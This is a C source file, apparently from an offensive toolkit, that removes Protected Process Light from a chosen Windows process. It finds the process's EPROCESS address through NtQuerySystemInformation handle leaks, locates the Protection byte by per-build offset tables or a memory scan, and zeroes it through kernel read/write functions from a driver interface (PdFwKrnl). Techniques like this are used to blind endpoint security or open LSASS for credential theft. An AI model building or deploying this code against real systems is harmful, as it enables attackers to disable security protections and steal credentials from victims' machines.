#include "RemovePPL.h"
#include "PdFwKrnl.h"
#include <stdio.h>

#define STATUS_SUCCESS              ((LONG)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((LONG)0xC0000004L)

// -----------------------
// NtQuerySystemInformation glue - SystemExtendedHandleInformation (class 64)
// Resolves the kernel VA (EPROCESS address) for a given user-mode handle.
// -----------------------

#define SystemExtendedHandleInformation 64

typedef struct _SYSTEM_HANDLE_ENTRY
{
    PVOID     Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG     GrantedAccess;
    USHORT    CreatorBackTraceIndex;
    USHORT    ObjectTypeIndex;
    ULONG     HandleAttributes;
    ULONG     Reserved;
} SYSTEM_HANDLE_ENTRY, *PSYSTEM_HANDLE_ENTRY;

typedef struct _SYSTEM_HANDLE_INFO
{
    ULONG_PTR        NumberOfHandles;
    ULONG_PTR        Reserved;
    SYSTEM_HANDLE_ENTRY Handles[1];
} SYSTEM_HANDLE_INFO, *PSYSTEM_HANDLE_INFO;

typedef LONG(WINAPI* FnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef LONG(WINAPI* FnRtlGetVersion)(PRTL_OSVERSIONINFOW);

// -----------------------
// EPROCESS offset table (x64)
//
// Fields resolved per Windows build:
//   UniqueProcessId - ULONG_PTR - must match the target PID
//   Protection      - UCHAR     - PS_PROTECTION byte; 0 = unprotected
//
// Ranges:
//   14393-17763  Windows 10 1607-1809
//   18362-22631  Windows 10 1903 - Windows 11 23H2
//   26100+       Windows 11 24H2
//
// Verify with: dt nt!_EPROCESS in WinDbg on the target machine.
// -----------------------

typedef struct _EPROC_OFFSETS
{
    DWORD dwBuildMin;
    DWORD dwBuildMax;
    DWORD dwUniqueProcessId;
    DWORD dwProtection;
} EPROC_OFFSETS;

static const EPROC_OFFSETS kEprocOffsetTable[] =
{
    { 14393, 17763, 0x2E8, 0x6CA },
    { 18362, 22631, 0x440, 0x87A },
    { 26100, 99999, 0x440, 0x9CA },
};

// -----------------------
// Helpers
// -----------------------

// Returns the Windows build number via RtlGetVersion to avoid VerifyVersionInfo manifests.
static DWORD GetWindowsBuildNumber(VOID)
{
    FnRtlGetVersion       pfnRtlGetVersion = NULL;
    RTL_OSVERSIONINFOW    OsVersionInfo    = { sizeof(OsVersionInfo) };

    pfnRtlGetVersion = (FnRtlGetVersion)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "RtlGetVersion"
    );

    if (!pfnRtlGetVersion)
        return 0;

    pfnRtlGetVersion(&OsVersionInfo);
    return OsVersionInfo.dwBuildNumber;
}

// Finds the EPROC_OFFSETS entry matching dwBuild; returns FALSE if unsupported.
static BOOL LookupEprocOffsets(
    _In_  DWORD  dwBuild,
    _Out_ PDWORD pdwPidOffset,
    _Out_ PDWORD pdwProtOffset
)
{
    DWORD dwIndex = 0;

    for (dwIndex = 0; dwIndex < ARRAYSIZE(kEprocOffsetTable); dwIndex++)
    {
        if (dwBuild >= kEprocOffsetTable[dwIndex].dwBuildMin &&
            dwBuild <= kEprocOffsetTable[dwIndex].dwBuildMax)
        {
            *pdwPidOffset  = kEprocOffsetTable[dwIndex].dwUniqueProcessId;
            *pdwProtOffset = kEprocOffsetTable[dwIndex].dwProtection;
            return TRUE;
        }
    }

    return FALSE;
}

// Scans pbBuffer for the first ULONG_PTR-aligned occurrence of dwPid.
// Returns the byte offset into pbBuffer, or (DWORD)-1 if not found.
static DWORD ScanBufferForPid(
    _In_ PBYTE pbBuffer,
    _In_ DWORD cbBuffer,
    _In_ DWORD dwPid
)
{
    DWORD dwOffset = 0;

    for (dwOffset = 0; dwOffset + sizeof(ULONG_PTR) <= cbBuffer; dwOffset += sizeof(ULONG_PTR))
    {
        if (*(ULONG_PTR*)(pbBuffer + dwOffset) == (ULONG_PTR)dwPid)
            return dwOffset;
    }

    return (DWORD)-1;
}

// Resolves the kernel VA of EPROCESS for hProcess via
// NtQuerySystemInformation(SystemExtendedHandleInformation).
// Matches on our own PID and the handle value to find the Object pointer.
static ULONG_PTR GetEprocessAddress(
    _In_ HANDLE hProcess
)
{
    FnNtQuerySystemInformation pfnNtQSI = NULL;
    PSYSTEM_HANDLE_INFO        pHandleInfo                 = NULL;
    DWORD                      dwMyPid                     = 0;
    ULONG_PTR                  uHandleValue                = 0;
    ULONG                      cbBuffer                    = 0x80000;
    ULONG_PTR                  uResult                     = 0;
    LONG                       lStatus                     = STATUS_SUCCESS;
    ULONG_PTR                  uIndex                      = 0;
    PSYSTEM_HANDLE_ENTRY       pEntry                      = NULL;

    pfnNtQSI = (FnNtQuerySystemInformation)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation"
    );

    if (!pfnNtQSI)
        return 0;

    dwMyPid      = GetCurrentProcessId();
    uHandleValue = (ULONG_PTR)hProcess;

    do
    {
        if (pHandleInfo)
            HeapFree(GetProcessHeap(), 0, pHandleInfo);

        pHandleInfo = (PSYSTEM_HANDLE_INFO)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, cbBuffer
        );

        if (!pHandleInfo)
            return 0;

        lStatus  = pfnNtQSI(
            SystemExtendedHandleInformation, pHandleInfo, cbBuffer, &cbBuffer
        );
        cbBuffer += 0x10000;

    } while (lStatus == STATUS_INFO_LENGTH_MISMATCH);

    if (lStatus != STATUS_SUCCESS)
        goto _END_OF_FUNC;

    for (uIndex = 0; uIndex < pHandleInfo->NumberOfHandles; uIndex++)
    {
        pEntry = &pHandleInfo->Handles[uIndex];

        if (pEntry->UniqueProcessId == (ULONG_PTR)dwMyPid &&
            pEntry->HandleValue     == uHandleValue)
        {
            uResult = (ULONG_PTR)pEntry->Object;
            break;
        }
    }

_END_OF_FUNC:
    if (pHandleInfo)
        HeapFree(GetProcessHeap(), 0, pHandleInfo);

    return uResult;
}

// Reads a chunk of EPROCESS, locates the Protection byte via static offsets
// (with dynamic scan as fallback), then zeroes it to strip PPL.
static BOOL ClearProtectionByte(
    _In_ HANDLE     hDev,
    _In_ ULONG_PTR  uEprocess,
    _In_ DWORD      dwPid
)
{
    const DWORD  cbChunk           = 0x1200;
    PBYTE        pbBuffer          = NULL;
    DWORD        dwBuild           = 0;
    DWORD        dwPidOffset       = (DWORD)-1;
    DWORD        dwProtOffset      = (DWORD)-1;
    DWORD        dwStaticPidOffset = 0;
    DWORD        dwStaticProtOffset = 0;
    ULONG_PTR    uReadPid          = 0;
    UCHAR        ucProtection      = 0;
    UCHAR        ucZero            = 0;
    DWORD        iDelta            = 0;
    DWORD        dwCandOffset      = 0;

    // Known relative deltas from UniqueProcessId to Protection for each supported build range
    static const DWORD kPidToProtDeltas[] = { 0x3E2, 0x43A, 0x58A };

    dwBuild = GetWindowsBuildNumber();

    printf("[*] Windows build  : %lu\n", dwBuild);
    printf("[*] EPROCESS       : 0x%016I64X\n", (ULONG64)uEprocess);

    pbBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbChunk);
    if (!pbBuffer)
        return FALSE;

    if (!KernelReadMem(hDev, uEprocess, pbBuffer, cbChunk))
    {
        printf("[-] KernelReadMem EPROCESS failed\n");
        HeapFree(GetProcessHeap(), 0, pbBuffer);
        return FALSE;
    }

    // Step 1: static offset lookup with PID validation
    if (LookupEprocOffsets(dwBuild, &dwStaticPidOffset, &dwStaticProtOffset))
    {
        if (dwStaticPidOffset + sizeof(ULONG_PTR) <= cbChunk)
            uReadPid = *(ULONG_PTR*)(pbBuffer + dwStaticPidOffset);

        if (uReadPid == (ULONG_PTR)dwPid)
        {
            dwPidOffset  = dwStaticPidOffset;
            dwProtOffset = dwStaticProtOffset;
            printf("[*] Offsets (table): UniqueProcessId=0x%lX  Protection=0x%lX\n",
                dwPidOffset, dwProtOffset);
        }
        else
        {
            printf("[!] Static offset mismatch (expected PID %lu, read %I64u) - scanning\n",
                dwPid, (ULONG64)uReadPid);
        }
    }
    else
    {
        printf("[!] Build %lu not in offset table - scanning\n", dwBuild);
    }

    // Step 2: dynamic scan fallback
    if (dwPidOffset == (DWORD)-1)
    {
        dwPidOffset = ScanBufferForPid(pbBuffer, cbChunk, dwPid);

        if (dwPidOffset == (DWORD)-1)
        {
            printf("[-] Could not locate UniqueProcessId in EPROCESS\n");
            HeapFree(GetProcessHeap(), 0, pbBuffer);
            return FALSE;
        }

        printf("[*] UniqueProcessId found dynamically at offset 0x%lX\n", dwPidOffset);

        for (iDelta = 0; iDelta < ARRAYSIZE(kPidToProtDeltas); iDelta++)
        {
            dwCandOffset = dwPidOffset + kPidToProtDeltas[iDelta];

            if (dwCandOffset < cbChunk && pbBuffer[dwCandOffset] != 0)
            {
                dwProtOffset = dwCandOffset;
                printf("[*] Protection byte at offset 0x%lX (delta +0x%lX) = 0x%02X\n",
                    dwProtOffset, kPidToProtDeltas[iDelta], pbBuffer[dwCandOffset]);
                break;
            }
        }

        if (dwProtOffset == (DWORD)-1)
        {
            printf("[*] No non-zero Protection byte found - process is not PPL-protected\n");
            HeapFree(GetProcessHeap(), 0, pbBuffer);
            return TRUE;
        }
    }

    // Step 3: read current byte, then zero it
    ucProtection = (dwProtOffset < cbChunk) ? pbBuffer[dwProtOffset] : 0;

    HeapFree(GetProcessHeap(), 0, pbBuffer);
    pbBuffer = NULL;

    printf("[*] Protection byte: 0x%02X\n", ucProtection);

    if (ucProtection == 0)
    {
        printf("[*] Process is not PPL-protected (Protection already 0)\n");
        return TRUE;
    }

    if (!KernelWriteMem(hDev, uEprocess + dwProtOffset, &ucZero, sizeof(ucZero)))
    {
        printf("[-] KernelWriteMem Protection byte failed\n");
        return FALSE;
    }

    printf("[+] Protection byte cleared - PPL removed\n");
    return TRUE;
}

// -----------------------
// Functions
// -----------------------

BOOL RemovePPL(
    _In_ HANDLE hDev,
    _In_ DWORD  dwPid
)
{
    HANDLE    hProc    = NULL;
    ULONG_PTR uEprocess = 0;

    // PROCESS_QUERY_LIMITED_INFORMATION is sufficient and works against PPL processes
    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid);
    if (!hProc)
    {
        printf("[-] OpenProcess(QUERY_LIMITED) failed for PID %lu: 0x%08lX\n",
            dwPid, GetLastError());
        return FALSE;
    }

    uEprocess = GetEprocessAddress(hProc);
    CloseHandle(hProc);

    if (!uEprocess)
    {
        printf("[-] Failed to resolve EPROCESS address for PID %lu\n", dwPid);
        return FALSE;
    }

    return ClearProtectionByte(hDev, uEprocess, dwPid);
}
